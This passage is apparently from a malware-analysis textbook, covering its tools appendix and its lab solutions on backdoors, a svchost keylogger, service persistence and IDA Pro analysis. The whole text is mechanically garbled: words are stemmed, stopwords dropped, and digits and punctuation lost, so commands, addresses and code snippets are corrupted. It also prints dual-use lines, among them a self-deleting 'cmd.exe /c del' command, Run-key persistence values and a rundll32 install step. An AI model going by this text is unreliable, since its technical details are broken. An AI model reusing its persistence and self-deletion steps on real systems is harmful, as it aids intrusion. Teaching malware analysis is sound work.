book chapter provid indepth introduct tool recommend commerci version httpwwwhexrayscom freewar version avail httpwwwhexrayscomproductsidasupportdownloadfreewareshtml immun debugg immun debugg immdbg freeli avail usermod debugg deriv ollydbg sourc code discuss chapter except immdbg cosmet modifi ollydbg gui ad fulli function python interpret api scriptabl debug chapter lab demonstr use immdbg python script abil download immdbg httpwwwimmunityinccom import reconstructor import reconstructor imprec use tool manual unpack piec malwar import address tabl iat often damag dump memori unpack use imprec repair tabl provid malwar run memori dump version disk imprec best repair binari download imprec free httptutsyoucomdownloadphpview inetsim inetsim linuxbas softwar suit simul common networkservic find use dynam analysi sure instal linux virtual machin set virtual network malwar analysi window vm inetsim emul mani popular servic microsoft internet inform servic ii web server even listen port incom connect discuss inetsim chapter download free httpwwwinetsimorg lordp lordp free tool dump execut memori allow pe edit use repair program dump memori use anoth method lordp commonli use unpack malwar download free httpwwwwoodmanncomcollaborativetoolsindexphplordp malcod analyst pack malcod analyst pack contain seri util one instal use window shell extens string md hash calcul chm decompil option chm decompil option handi deal malici window help file also includ fakedn use tool spoof dn respons userspecifi address util longer offici support might still abl download httplabsidefensecomsoftwaredownloaddownloadid memoryz memoryz free memori forens tool enabl dump analyz live memori use memoryz acquir live memori individu process well identifi modul load given system includ driver kernellevel execut memoryz also detect rootkit hook instal choos use memoryz sure download audit viewer tool visual memoryz output make memori analysi process quicker intuit audit viewer includ malwar rate index help identifi suspici content memori dump download memoryz audit viewer free httpwwwmandiantcom netcatnetcat known tcpip swiss armi knife use monitor start inbound outbound connect netcat use dynam analysi listen port know malwar connect netcat print data receiv screen via standard output cover netcat usag dynam analysi chapter also talk attack use chapter netcat instal default cygwin linux distribut download window version free httpjoncratonorgmediafilesncntzip officemalscann officemalscann free commandlin tool find malici code microsoft offic document locat shellcod embed pe file ole stream excel word powerpoint document decompress newer format microsoft offic document recommend run officemalscann scan brute option preoffic document inflat option postoffic document download officemalscann httpwwwreconstructerorg ollydbg ollydbg one wide use debugg malwar analysi discuss ollydbg extens throughout book chapter provid indepth introduct tool ollydbg usermod x debugg gui sever plugin avail ollydbg ollydump use unpack discuss chapter download ollydbg free httpwwwollydbgd osr driver loader osr driver loader freeli avail tool load devic driver memori guibas tool use easili load start driver without reboot use dynam analyz malici devic driver dont instal discuss osr driver loader tool chapter download httpwwwosronlinecom pdf dissector pdf dissector commerci guibas pdf analysi tool graphicallypars pdf element automat decompress object make easi extract malici javascript program includ javascript deobfusc interpret help understand execut malici script pdf dissector also use identifi known vulner tool avail purchas httpwwwzynamicscom pdf tool pdf tool classic tool kit pdf analysi tool kit consist two tool pdfidpi pdfparserpi pdfidpi scan pdf object tell think pdf contain javascript sinc malici pdf use javascript inform help quickli identifi potenti riski pdf pdfparserpi help examin content import object pdf file without render download pdf tool free httpblogdidierstevenscomprogramspdftool pe explor pe explor use tool view pe header section importexport tabl power peview allow edit structur pe explor contain static unpack upx upack nspackcompress file unpack featur seamless save lot time simpli load pack binari pe explor automat unpack file download trial version purchas commerci version pe explor httpwwwheaventoolscom peid peid free static analysi tool use packer compil detect includ signatur detect packer cryptor compil pe format file peid also plugin avail download use krypto analyz kanal kanal use find common cryptograph algorithm pe file provid abil export inform ida pro discuss peid chapter chapter chapter although peid project discontinu still abl download tool httpwwwpeidinfo peview peview freeli avail tool view pe file structur viewth pe header individu section importexport tabl use peview throughout book discuss chapter download peview httpwwwmagmacawjr process explor process explor power task manag use dynam analysi provid insight process current run system process explor show dll individu process handl event string discuss process explor chapter download process explor part sysintern suit tool httpwwwsysinternalscom process hacker process hacker power task manag similar process explor mani ad featur scan string regular express memori inject unload dll load driver creat start servic download process hacker httpprocesshackersourceforgenet process monitor process monitor procmon dynam analysi tool use view real time filesystem registri process activ filter output remov nois discuss process monitor chapter download process monitor part sysintern suit tool httpwwwsysinternalscom python python program languag allow quickli code task perform malwar analysi throughout book lab use python discuss chapter chapter ida pro immun debugg builtin python interpret allow quickli autom task chang interfac recommend learn python instal analysi machin download python free httpwwwpythonorg regshot regshot dynam analysi tool allow take compar tworegistri snapshot use simpli take snapshot registri run malwar wait finish make system chang take second snapshot compar two regshot also use take compar two snapshot filesystem directori specifi download regshot free httpsourceforgenetprojectsregshot resourc hacker resourc hacker use static analysi util view renam modifi ad delet extract resourc peformat binari tool work x x architectur malwar often extract malwar dll driver resourc section runtim find tool use extract section easili without run malwar discuss resourc hacker chapter chapter lab download resourc hacker httpwwwangusjcomresourcehack sandbox chapter discuss pluse minus use sandbox mani sandbox publicli avail also write public sandbox decent choic alway develop effort stay top market demonstr gfi sandbox chapter mani other includ joe sandbox bitblaz comodo threatexpert anubi norman cuckoo zero wine buster sandbox minibi hex editor everyon prefer tri see work sandboxi buster sandbox analyz sandboxi program run program isol environ prevent make perman chang system sandboxi design allow secur web brows sandbox aspect make use malwar analysi exampl use captur filesystem registri access program sandbox buster sandbox analyz bsa use sandboxi provid autom analysi report sandboxi bsa download httpwwwsandboxiecom httpbsaisoftwarenl snort snort popular open sourc network intrus detect system id discuss write networkbas signatur snort chapter snort run activ offlin packet captur write network signatur malwar use snort test good place start download snort httpwwwsnortorg string string use static analysi tool examin ascii unicod string binari data use string often quick way get highlevel overview malwar capabl program use thwart pack string obfusc discuss string chapter download string part sysintern suit tool httpwwwsysinternalscom tcpview tcpview tool graphic display detail list tcp udp endpoint system tool use malwar analysi allow see process own given endpoint tcpview help track process name analysi machin connect port idea process respons often happen process inject discuss chapter download tcpview part sysintern suit tool httpwwwsysinternalscom sleuth kit sleuth kit tsk c librari set commandlin tool forens analysi use find altern data stream file hidden rootkit tsk reli window api process ntf fat filesystem run tsk linux use cygwin window download tsk free httpwwwsleuthkitorg tor tor freeli avail onion rout network allow brows anonym internet recommend use tor whenev conduct research analysi check ip address performinginternet search access domain look inform might want expos dont gener recommend let malwar connect network use technolog like tor instal tor start brows visit site like httpwhatismyipaddresscom confirm ip return websit ip address tor download free httpswwwtorprojectorg truman truman tool creat safe environ without use virtual machin consist linux server client machin run window like inetsim truman emul internet also provid function easili grab memori window machin reimag quickli truman come script emul servic perform analysi linux even though tool longer develop help understand set baremet environ download truman free httpwwwsecureworkscomresearchtoolstruman windbg windbg popular allaround debugg distribut freeli microsoft use debug usermod kernelmod x x malwar windbg lack ollydbg robust gui provid commandlin interfac instead chapter focu kernelmod usag windbg mani malwar analyst choos use ollydbg usermod debug windbg kernel debug windbg download independ part window sdk httpmsdnmicrosoftcom wireshark wireshark open sourc network packet analyz use tool dynam analysi use captur network traffic gener malwar analyz mani differ protocol wireshark popular freeli avail tool packet captur easytous gui discuss wireshark usag chapter download wireshark httpwwwwiresharkorg upx ultim packer execut upx popular packer use malwar author chapter chapter discuss automat manual unpack malwar use upx encount packer wild tri unpack malwar upx download packer httpupxsourceforgenet vera visual execut revers analysi vera tool visual compil execut malwar analysi use ether framework gener visual base dynam trace data help analysi vera give highlevel overview malwar help unpack also interfac ida pro help brows vera graph ida pro disassembl download vera httpwwwoffensivecomputingnet virustot virustot onlin servic scan malwar use mani differ antiviru program upload file directli virustot check file differ antiviru engin dont want upload malwar also search md hash see virustot seen sampl discuss virustot start chapter sinc often use first step malwar analysi access virustot httpwwwvirustotalcom vmware workstat vmware workstat popular desktop virtual product mani altern vmware use book due popular chapter highlight mani vmware featur virtual network snapshot allow save current state virtual machin clone exist virtual machin purchas vmware workstat httpwwwvmwarecom download vmware player limit function free site volatil frameworkth volatil framework open sourc collect tool written python analyz live memori captur suit tool use malwar analysi use extract inject dll perform rootkit detect find hidden process tool suit mani user contributor new capabl constantli develop download latest version httpcodegooglecompvolatil yara yara open sourc project use identifi classifi malwar sampl allow creat descript malwar famili base string binari pattern find descript call rule consist set string logic rule appli binari data like file memori order classifi sampl tool use creat custom antiviruslik softwar signatur download yara free httpcodegooglecompyaraproject zero wine zero wine open sourc malwar sandbox distribut virtual machin run debian linux malwar sampl execut use zero wine emul window api call call log report malici activ zero wine even catch defeat certain antivirtu machin antidebug antiemul techniqu download zero wine httpzerowinesourceforgenet appendix c solut lab appendix contain solut lab appear end chapter lab provid short answer section follow detail analysi short answer section use quickli check see got right answer detail analysi use follow stepbystep exactli complet lab troubl complet lab use detail analysi section guid lab design run window xp machin administr privileg mani lab work window vista window lab solut short answer file written specif book write find signatur virustotalcom cours file becom part antiviru signatur result public book result differ file compil decemb within minut indic either file pack obfusc interest import labex findfirstfil findnextfil copyfil import tell us program search filesystem copi file interest import labdll createprocess sleep also see file import function wsdll provid network function examin cwindowssystemkernedl addit malici activ note file kern dll number instead letter l meant look like system file kern l dll file use host indic search malwar dll file contain refer local ip address address artifact program creat educ malici purpos real malwar ip address routabl would good networkbas indic use identifi malwar dll file probabl backdoor exe file use instal run dll detail analysi answer first question upload file virustotalcom perform scan antiviru signatur next open file peview file navig imagenthead imagefilehead time date stamp field tell us compil time file compil decemb within minut confirm suspicion file part packag fact compil time close strongli suggest file creat time author know file relat compil time found like exe use instal dll dll run check see either file pack file small reason number import wellform section appropri size peid label unpack code compil microsoft visual c tell us file pack fact file import tell us like small program notic dll file export abnorm indic file pack learn export section return file lab solut next look file import string begin exe import msvcrtdll function includ nearli everi execut part wrapper code ad compil look import kerneldl see function open manipul file well function findfirstfil findnextfil function tell us malwar search filesystem itcan open modifi file cant sure program search exe string suggest search execut victim system also see string cwindowssystemkern l dll cwindowssystemkern dll notic chang letter l number kerneldl file kern dll clearli meant disguis window kerneldl file file kern dll serv host base indic locat infect one analyz malici code next look import string labdll import function wsdll function import ordin dont know function import also see two interest function import kerneldl createprocess sleep commonli use backdoor function particularli interest us combin string exec sleep exec string probabl sent network command backdoor run program createprocess sleep string probabl use command backdoor program sleep malwar complex well return lab solut cover skill analyz fullylab solut short answer write file match antiviru signatur sever indic program pack upx unpack download upx run upx unpack file youll see interest import createservic internetopen internetopenurl check infect machin servic call malservic network traffic httpwwwmalwareanalysisbookcom detail analysi analyz lab solut upload file virustotalcom see match least three viru signatur one antiviru engin identifi malici download download addit malwar two identifi pack malwar demonstr use virustotalcom use one antiviru program scan file would probabl get inform upon open file peview sever indic tell us file pack obviou indic section name upx upx upx section name upxpack malwar could use peid confirm file pack natur foolproof even peid fail identifi file upxpack notic rel small number import first section upx virtual size x raw data size upx largest section mark execut probabl origin unpack code belong identifi program pack unpack download upx httpupxsourceforgenet run follow command upx newfilenam originalfilenam option say decompress file option specifi output filenameaft unpack look import section string import kerneldl msvcrtdll import nearli everi program tell us littl specif program import wininetdl tell us code connect internet internetopen internetopenurl import advapidl createservic tell us code creat servic look string see wwwmalwareanalysisbookcom probabl url open internetopenurl well malservic could name servic creat cant sure program weve found indic help search malwar across networklab solut short answer write viru engin identifi sampl malwar file pack cant unpack time question cant answer without unpack file question cant answer without unpack file detail analysi file labex virustotalcom report varieti differ signatur vaguesound name common signatur file pack fsg packer open file peview see sever indic file pack first file section name next see first section virtual size x raw data size run peid confirm identifi packer fsg dulekxt confirm file pack search import doesnt seem import tabl execut file without import tabl extrem rare absenc tell us tri anoth tool peview troubl process file open file depend walker see import tabl import two function loadlibrari getprocaddress pack file often import two function indic file pack tri unpack file use upx know file pack fsg rather upx well return file chapter cover skill unpack itlab solut short answer write antiviru engin identifi malici code download andor drop addit malwar onto system indic file pack obfusc accord file header program compil august clearli compil time fake cant determin file compil import advapidl indic program someth permiss import winexec writefil along result virustotalcom tell us program write file disk execut also import read inform resourc section file string systemwupdmgrex indic program could creat modifi file locat string wwwmalwareanalysisbookcomupdaterex probabl indic addit malwar store readi download resourc section contain anoth pe execut use resourc hacker save resourc binari data analyz binari file would analyz execut execut resourc section download program download addit malwar detail analysi labex file result virustotalcom suggest program relat download peview give indic file pack obfusc import advapidl tell us program someth permiss assum tri access protect file use special permiss import kerneldl tell us program load data resourc section loadresourc findresourc andsizeofresourc write file disk createfil writefil execut file disk winexec also guess program write file system directori call getwindowsdirectori examin string see wwwmalwareanalysisbokcomupdaterex probabl locat hold malici code download also see string systemwupdmgrex combin call getwindowsdirectori suggest file cwindowssystemwupdmgrex creat edit malwar know confid malici file download new malwar know download malwar guess store download malwar thing that odd program doesnt appear access network function interest part malwar resourc section open malwar resourc hacker see one resourc resourc hacker identifi type resourc binari mean arbitrari binari data look data meaningless notic string program run do mode string error messag includ do header begin pe file therefor conclud resourc addit execut file store resourc section lab exe fairli common techniqu use malwar continu analyz file resourc hacker click action save resourc binari file save resourc open file peview analyz file embed within look import see embed file one access network function call urldownloadtofil function commonli use malici download also call winexec probabl execut download filelab solut short answer malwar appear pack import exitprocess although string appear mostli clear obfusc malwar creat mutex name winvmx copi cwindowssystemvmxtoex instal run system startup creat registri key hklmsoftwaremicrosoftwindowscurrentversionrunvideodriv set copi locat malwar beacon consist size byte packet contain seemingli random data resolv wwwpracticalmalwareanalysiscom detail analysi begin basic static analysi techniqu look malwar pe file structur string figur c show kerneldl import figur c peview labex show one import one import binari exitprocess seen import address tabl without import tough guess program function program may pack sinc import like resolv runtim next look string shown follow list stubpathsoftwareclasseshttpshellopencommandv softwaremicrosoftact setupinstal compon test wwwpracticalmalwareanalysiscom admin videodriv winvmxvmxtoex softwaremicrosoftwindowscurrentversionrun softwaremicrosoftwindowscurrentversionexplorershel folder appdata wouldnt expect see string sinc import led us believ file pack mani interest string registri locat domain name well winvmx videodriv vmxtoex let see basic dynam analysi techniqu show us string use run malwar run procmon clear event start process explor set virtual network includ apatedn netcat listen port network captur wireshark run malwar start examin process process explor shown figur c begin click labex process list select view lower pane view handl view see malwar creat mutex name winvmx also select view lower pane view dll see malwar dynam load dll wsdll wshtcpipdll mean network functionalityfigur c process explor view labex show mutex creat next use procmon look addit inform bring filter dialog select filter filter set three filter one process name show labex system two oper shown figur c includ regsetvalu writefil show chang malwar make filesystem registri figur c process monitor filter dialog show filter set process name oper set filter click appli see filter result entri arereduc thousand seen figur c notic one entri writefil nine entri regsetvalu figur c procmon filter result three filter set discuss chapter often need filter certain amount nois entri figur c regsetvalu hklmsoftwaremicrosoftcryptographyrngse typic nois result random number gener seed constantli updat registri softwar left two interest entri shown figur c first writefil oper doubleclick entri tell us wrote byte cwindowssystemvmxtoex happen size file labex open window explor brows locat show newli creat file md hash labex tell us malwar copi name locat use hostbas indic malwar use hardcod filenam next doubleclick entri figur see malwar wrote follow data registri hklmsoftwaremicrosoftwindowscurrentversionrunvideodrivercwindowssystemvmxtoex newli creat registri entri use run vmxtoex system startup use hklmsoftwaremicrosoftwindowscurrentversionrun locat creat key name videodriv bring procmon filter dialog remov oper filter slowli comb entri inform may miss next turn attent network analysi tool set basic dynam analysi first check apatedn see malwar perform dn request examin output see request forwwwpracticalmalwareanalysiscom match string list shown earlier sure malwar chanc make addit dn request perform analysi process coupl time see dn request chang use nxdomain function apatedn complet network analysi examin netcat result shown follow list c nc l p ijyl f h g xpo nie p f jy z vaixikq w wm xh xl f xgi xsbx look like got lucki malwar appear beacon port listen netcat port use inetsim listen port run test sever time data appear random time followup wireshark tell us beacon packet consist size byte appear contain random data relat ssl protocol normal oper port lab solut short answer instal malwar servic run malwar export installa function via rundllex rundllex labdllinstalla run malwar start servic instal use net command net start iprip use process explor determin process run servic sinc malwar run within one svchostex file system hover one see servic name search labdll use find dll featur process explor procmon filter pid found use process explor default malwar instal servic iprip display name intranet network awar ina descript depend ina collect store network configur locat inform notifi applic inform chang instal persist registri hklmsystemcurrentcontrolsetservicesiprip parametersservicedl currentdirectorylabdl renam labdll someth els malwaredl write malwaredl registri key instead use name labdll malwar resolv domain name practicalmalwareanalysiscom connect host port use appear http get request servehtml use userag computernam window xp detail analysi begin basic static analysi look pe file structur string figur c show dll five export list export servicemain suggest malwar need instal servic order run properlyfigur c peview labdll export follow list show malwar interest import function bold openservic deleteservic openscmanag createservic regopenkeyex regqueryvalueex regcreatekey regsetvalueex internetopen internetconnect httpopenrequest httpsendrequest internetreadfil includ servicemanipul function createservic registrymanipul function regsetvalueex import network function httpsendrequest suggest malwar use http next examin string shown follow list yubmvjda practicalmalwareanalysiscom servehtml dwzdxbwbj cxlzxa yk cxvpda window xp http quitexit getfil cmdex c depend ina collect store network configur locat inform notifi applic inform chang systemrootsystemsvchostex k systemcurrentcontrolsetservic intranet network awar ina systemrootsystemsvchostex k netsvc netsvc softwaremicrosoftwindow ntcurrentversionsvchost iprip see sever interest string includ registri locat domain name uniqu string like iprip servehtml varieti encod string basic dynam techniqu may show us string import use result basic static analysi techniqu lead us believ malwar need instal servic use export function installa well use function attempt instal malwar well launch regshot take baselin snapshot registri use process explor monitor process run system set regshot process explor instal malwar use rundllex follow c rundllex labdllinstalla instal malwar use process explor confirm termin make sure rundllex longer process list next take second snapshot regshot see malwar instal registri edit regshot result shown follow list key ad hklmsystemcurrentcontrolsetservicesiprip valu ad hklmsystemcurrentcontrolsetservicesipripparametersservicedl zlabdll hklmsystemcurrentcontrolsetservicesipripimagepath systemrootsystemsvchostex k netsvc hklmsystemcurrentcontrolsetservicesipripdisplaynam intranet network awar ina hklmsystemcurrentcontrolsetservicesipripdescript depend ina collect store network configur locat inform notifi applic inform chang key ad section show malwar instal serviceiprip sinc malwar dll depend execut launch fact see imagepath set svchostex mean malwar launch insid svchostex process rest inform displaynam descript creat uniqu fingerprint use identifi malici servic examin string close see softwaremicrosoftwindow nt currentversionsvchost messag specifi servic name svchost netsvc must one follow follow hunch examin svchostnetsvc registri key see potenti servic name might use like appmgmt run lab dllinstalla instal malwar servic instead iprip servic previou list instal malwar servic could launch first well set rest basic dynam tool run procmon clear event start process explor set virtual network includ apatedn netcat listen port sinc see http string list sinc malwar instal iprip servic start use net command window follow c net start iprip intranet network awar ina servic start intranet network awar ina servic start success fact display name ina match inform found registri tell us malici servic start next open process explor attempt find process malwar run select find find handl dll open dialog shown figur c enter labdll click search shown figur result tell us labdll load svchostex pid specif pid may differ system figur c search dll process explor process explor select view lower pane view dll choos svchostex run pid figur c show result display name intranet network awar ina shown confirm malwar run svchostex confirm see lab dll load figur c examin servic malwar process explor next turn attent network analysi tool first check apatedn see malwar perform dn request output show request practicalmalwareanalysiscom match string list shown earlier note take second start servic see network traffic program sleepbefor attempt network access network connect fail reason exampl forgot set apatedn wait minut attempt connect complet network analysi examin netcat result follow c nc l p get servehtml http accept userag malwareanalysi window xp host practicalmalwareanalysiscom see malwar perform http get request port listen port netcat sinc saw http string list run test sever time data appear consist across run creat coupl network signatur data malwar consist get request servehtml use get request network signatur malwar also use userag malwareanalysi window xp malwareanalysi malwar analysi virtual machin name portion userag differ machin second part userag window xp consist use network signaturelab solut short answer malwar perform process replac svchostex compar disk imag svchostex memori imag show memori imag string practicalmalwareanalysislog enter disk imag neither malwar creat log file practicalmalwareanalysislog program perform process replac svchostex launch keylogg detail analysi lab begin launch process explor procmon procmon start event stream quickli use file captur event toggl event captur best keep event captur dynam analysi program start your readi execut program use filter filter open filter dialog ensur default filter enabl click reset button labex run command prompt doubleclick icon run labex visibl insid process explor notic creat subprocess svchostex exit leav svchostex process run orphan process shown figur c orphan process parent process list process tree structur fact svchostex orphan highli unusu highli suspici figur c process explor view orphan svchostex investig rightclick select properti orphan svchostex process shown figur c process appear validsvchostex process pid svchostex suspici svchostex typic child servicesex properti page select string show string execut imag disk memori toggl imag memori radio button show signific discrep imag shown figur c string memori right contain practicalmalwareanalysislog enter seen neither found typic window svchostex file disk seen left figur c process explor show string normal contain svchostex presenc string practicalmalwareanalysislog coupl string like enter cap lock suggest program keylogg test assumpt open notepad type short messag see malwar perform keylog use pid found process explor orphan svchostex creat filter procmon show event pid see figur c createfil writefil event svchostex write file name practicalmalwareanalysislog string visibl memori view orphan svchostex processfigur c procmon output svchostex pid open practicalmalwareanalysislog simpl text editor reveal keystrok enter notepad conclud malwar keylogg use process replac svchostex lab solut short answer run malwar doubleclick program immedi delet suspect may need provid commandlin argument miss compon program tri use commandlin paramet shown string list like fruit indepth analysi requir well analyz malwar lab chapter detail analysi begin basic static analysi examin pe file structur string see malwar import network function servicemanipul function registrymanipul function follow list notic number interest string softwaremicrosoft xp kerneldl http get noth download upload sleep cmdex nul c del http wwwpracticalmalwareanalysiscom nt authoritylocalservic manag servic exe systemrootsystem ks hs ps per cc see string domain name registri locat softwaremicrosoft xp string like download upload combin http string suggest malwar http backdoor string cc could commandlin paramet exampl may standfor instal let see basic dynam techniqu show us string use run malwar run procmon clear event start process explor set virtual network run malwar appear immedi delet see noth els interest watch process explor next use procmon filter process name labex arent interest writefil regsetvalu entri upon dig find entri process creat doubleclick entri bring dialog shown figur c see malwar delet system use cwindowssystemcmdex c del zlab exe nul seen figur c procmon view process creat perform selfdelet tri run malwar command line use commandlin option saw string list cc fail result program delet isnt much basic dynam techniqu point dig deeper malwar revisit malwar chapter labslab solut short answer dllmain found xde text section import gethostbynam found xcc idata section gethostbynam import call nine time five differ function throughout malwar dn request picspracticalmalwareanalysiscom made malwar call gethostbynam x succe ida pro recogn local variabl function x ida pro recogn one paramet function x string cmdex c locat xb area code appear creat remot shell session attack os version store global variabl dwordec registri valu locat hklmsoftwaremicrosoftwindowscurrentversionworktim worktim queri sent remot shell connect pslist export send process list across network find particular process name list get inform getsystemdefaultlangid send sprintf api call made sube function could renam someth use like getsystemlanguag dllmain call strncpi strnicmp createthread strlen directli depth call varieti api call includ sleep winexec gethostbynam mani network function call malwar sleep second argument argument correspond three symbol constant ipprototcp sockstream afinet instruct use virtual machin detect xdb xdh correspond vmxh string use crossrefer see string found virtual machin caller function random data appear exist xd run labpi random data unobfusc reveal string press key keyboard turn readabl string xdoor backdoor string decod practic malwar analysi lab script work xore x byte data x modifi byte ida pro use patchbyt detail analysi load malici dll ida pro taken directli dllmain xde may need display line number graph view use option gener check line prefix toggl graph tradit view press spacebar allow see line number without chang option dllmain want begin analysi code execut dllentrypoint dllmain like gener compil dont want get bog analyz compilergener code answer question begin view import dll select view open subview import list find gethostbynam doubleclick see disassembl gethostbynam import resid locat xcc idata section binari see number function call gethostbynam check cross refer press ctrl x cursor gethostbynam bring window shown figur c text line bottom window tell us nine crossrefer gethostbynam version ida pro doublecount crossrefer p refer call r refer read refer sinc calldword ptr import cpu must read import call examin crossrefer list close see gethostbynam call five separ function figur c crossrefer gethostbynam press g keyboard quickli navig x locat see follow code call gethostbynam e mov eax add eax dh push eax call ds gethostbynam gethostbynam method take singl parametertyp string contain domain name therefor need work backward figur eax gethostbynam call appear move eax doubleclick offset see string rdopicspracticalmalwareanalysiscom locat see pointer string advanc xd byte whichget pointer string picspracticalmalwareanalysiscom eax call gethostbynam figur c show string memori ad xd eax advanc pointer locat url memori call perform dn request get ip address domain figur c adjust string pointer access url answer question press g keyboard navig x order analyz sub figur c see ida pro done recogn label function local variabl paramet label local variabl correspond neg offset count prepend var freewar version ida pro count local variabl version use may detect slightli differ number local variabl paramet label referenc posit offset see ida pro recogn one paramet function label arg figur c ida pro function layoutrecogn local variabl paramet answer question begin view string dll select view open subview string list doubleclick cmdex c see disassembl notic string resid xdoorsd section pe file xb check crossrefer string see one xd string push onto stack examin graph view function show seri memcmp function compar string cd exit instal inject uptim also see string refer earlier function xd contain string remot shell session examin function call make show seri call recv send use three piec evid guess look remot shell session function dwordec global variabl doubleclick xc show locat memori xec within data section dll check crossrefer press ctrl x show referenc three time one refer modifi dwordec thefollow list show dwordec modifi call sub mov dwordec eax see eax move dwordec eax return valu function call made previou instruct therefor need determin function return examin sub doubleclick look disassembl sub function contain call getversionex obtain inform current version os shown follow list af call ds getversionexa b xor eax eax b cmp ebpversioninformationdwplatformid setz al dwplatformid compar number order determin set al regist al set platformid verplatformwinnt simpl check make sure os window higher conclud global variabl typic set previous discuss remot shell function xff contain seri memcmp function start xff x see memcmp robotwork follow push size lea eax ebpdst c push offset arobotwork robotwork push eax buf call memcmp add esp ch test eax eax c jnz short loc e push ebp call suba jnz taken string match robotwork call call examin suba see queri registri hklmsoftwaremicrosoftwindowscurrentversionworktim worktim return inform network socket pass function answer question begin view export dll select view open subview export find pslist list doubleclick move cursor x start export code functionappear take one two path depend result subc subc function check see os version window vista xp code path use createtoolhelpsnapshot help grab process list infer string api call code path return process list socket use send answer question graph function crossrefer select view graph xref cursor function name interest go sube press g keyboard enter xe figur c show result graph crossrefer sube see function call getsystemdefaultlangid send inform tell us function like send languag identifi network socket rightclick function name give meaning name sendlanguageid note perform quick analysi like easi way get highlevel overview binari approach particularli handi analyz larg binari figur c graph crossrefer sube determin mani window api function dllmain call directli scroll method look api call select view graph xref open dialog shown figur c start end address correspond start dllmain specif xde care crossrefer dllmain select recurs depth display function dllmain call directli figur c show result graph api call seen gray see function call recurs depth follow step select recurs depth result much larger graph even show recurs call back dllmain figur c dialog set custom crossrefer graph xde figur c crossrefer graph dllmain recurs depth referenc question call sleep x shown inth follow list sleep take one parameterth number millisecond sleepand see push stack eax mov eax add eax dh push eax str call ds atoi imul eax eh pop ecx push eax dwmillisecond call ds sleep work backward look like eax multipli xe decim tell us result call atoi multipli get number second sleep work backward also see move eax see offset doubl click refer string cti next see xd ad offset caus eax point call atoi convert string number multipli get millisecond second long program sleep string upon execut referenc question call socket x shown left column tabl c see push onto stack number correspond symbol constant describ msdn page socket rightclick number select use symbol constant present dialog list constant ida pro particular valu exampl number correspond afinet use set ipv socket stand sockstream stand ipprototcp therefor socket configur tcp ipv commonli use http tabl c appli symbol constant call socket symbol constant symbol constant fb push fd push ff push call dssocket fb push ipprototcp fd push sockstream ff push afinet call dssocket answer question search instruct select search textand enter could also select search sequenc byte search ed opcod instruct check find occurr search dialog either option present new window list match scroll result show one instanc instruct xdb follow c mov eax dh vmxh cc mov ebx mov ecx ah mov edx h db eax dx mov instruct xc move xd eax rightclick valu show correspond ascii string vmxh confirm snippet code antivirtu machin techniqu employ malwar discuss specif techniqu other chapter check crossrefer function execut techniqu offer confirm see found virtual machin code comparison referenc question jump cursor xd use g key see look like random byte data noth readabl suggest run python script provid select file script file select python script shown follow list sea screenea rangexx b byte seai decodedbyt b x patchbyt seaidecodedbyt script grab current locat cursor use offset decod data next loop x grab valu byte use call byte take byte xor x final patch byte ida pro display without modifi origin file easili custom script use script run see data xd chang someth readabl turn ascii string press key keyboard cursor xd reveal string xdoor backdoor string decod practic malwar analysi lab lab solut short answer major code construct statement locat x printf subroutin locat xf program check activ internet connect activ connect found print success internet connect connect found print error internet program use malwar check connect attempt connect internet detail analysi begin perform basic static analysi execut look import see dll wininetdl function internetgetconnectedst import window internet wininet api enabl applic interact http protocol access internet resourc use msdn learn window api function check statu internet connect local system string error internet success internet connect hint program may check activ internet connect system next perform basic dynam analysi execut noth overli excit happen execut run command line simpli print success internet connect termin final load file ida pro full analysi much disassembl gener compil need care avoid go rabbit hole irrelev code therefor start main function typic code written malwar author begin case main function start x main function call function x appear key function interest one call main figur c show flow graph functionfigur c disassembl flow graph function x graph function ida pro use view graph flow chart look graph code see common code construct two differ code path depend result call internetgetconnectedst cmp instruct use compar result contain eax jz instruct use control flow msdn page internetgetconnectedst state function return activ internet connect otherwis return therefor code take fals branch result zero flag zf clear otherwis take true branch code construct use function statement function call subroutin xf two locat dive function quickli get lost rabbit hole function printf surprisingli ida pro commerci freewar version alway recogn label printf function therefor must look certain signal hint unlabel call printf one easi way tell identifi paramet push onto stack call subroutin case format string push onto stack n end string denot line feed also given context string deduc function printf therefor renam function printf mark throughout code shown figur c printf function call see eax set either function return summar function check activ internet connect print result check follow return connect malwar often perform similar check valid internet connectionlab solut short answer first subroutin x lab solut statement check activ internet connect printf subroutin locat xf second function call main locat x download web page locat httpwwwpracticalmalwareanalysiscomcchtm pars html comment begin page subroutin use charact array fill data call internetreadfil array compar one byte time pars html comment two networkbas indic program use http user agent internet explor pma download web page locat httpwwwpracticalmalwareanalysiscomcchtm first program check activ internet connect none found program termin otherwis program attempt download web page use uniqu userag web page contain embed html comment start next charact pars comment print screen format success pars command x x charact pars html comment success program sleep minut termin detail analysi begin perform basic static analysi binari see sever new string interest shown exampl c exampl c interest new string contain lab solut error fail get command error fail readfil error fail openurl httpwwwpracticalmalwareanalysiscomcchtm internet explor pma success pars command cthe three error messag string see suggest program may open web page pars command also notic url html web page httpwwwpracticalmalwareanalysiscomcchtm domain use immedi networkbas indic import contain sever new window api function use network shown exampl c exampl c interest new import function contain lab solut internetreadfil internetclosehandl internetopenurla internetopena function part wininet simpl api use http network work follow internetopena use initi use wininet librari set userag use http commun internetopenurla use open handl locat specifi complet ftp http url program use handl access someth open discuss handl chapter internetreadfil use read data handl open internetopenurla internetclosehandl use close handl open file next perform dynam analysi choos listen port wininet often use http saw url string set netcat listen port redirect dn accordingli see dn queri wwwpracticalmalwareanalysiscom program request web page url shown exampl c tell us web page signific malwar wont know analyz disassembl exampl c netcat output listen port cnc l p get cchtm http userag internet explor pma host wwwpracticalmalwareanalysiscomfin load execut ida pro begin analysi main method sinc much code gener compil look disassembl main notic call method x saw lab solut howev two new call f main method lab solut new call xf notic two paramet push stack call one paramet format string success pars command c byte return previou call x format charact c tell us look format string therefor deduc printf subroutin locat xf renam renam everywher referenc printf subroutin print string c replac paramet push stack next examin new call x function contain wininet api call discov basic static analysi process first call internetopen initi use wininet librari notic internet explor pma push stack match userag notic dynam analysi next call internetopenurl open static web page push onto stack paramet function caus dn request saw dynam analysi exampl c show internetopenurla internetreadfil call exampl c internetopenurla internetreadfil call call ds internetopenurla mov ebphfil eax cmp ebphfil lea edx ebpdwnumberofbytesread push edx lpdwnumberofbytesread push h dwnumberofbytestoread lea eax ebpbuff ac push eax lpbuffer ad mov ecx ebphfil b push ecx hfile b call ds internetreadfil b mov ebpvar eax ba cmp ebpvar jnz short loce see return valu internetopenurla move localvari hfile compar function termin otherwis hfile variabl pass next function internetreadfil hfile variabl handlea way access someth open handl access url internetreadfil use read web page open internetopenurla read msdn page api function learn paramet import paramet second one ida pro label buffer shown buffer array data case read x byte worth data 